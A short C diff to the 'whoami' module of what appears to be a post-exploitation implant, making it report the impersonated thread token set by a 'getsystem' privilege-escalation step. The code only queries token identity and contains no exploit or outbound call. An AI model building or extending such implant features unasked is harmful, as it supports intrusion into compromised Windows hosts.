@@ -162,9 +162,13 @@ void mod_whoami(Buffer *out) {
     char line[512];
     HANDLE hToken;
 
-    if (!OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, &hToken)) {
-        buf_append(out, "Failed to open process token\n", 29);
-        return;
+    /* Try thread token first (set by ImpersonateLoggedOnUser / getsystem BOF),
+       fall back to process token if no impersonation is active */
+    if (!OpenThreadToken(GetCurrentThread(), TOKEN_QUERY, FALSE, &hToken)) {
+        if (!OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, &hToken)) {
+            buf_append(out, "Failed to open token\n", 21);
+            return;
+        }
     }
 
     /* Username */
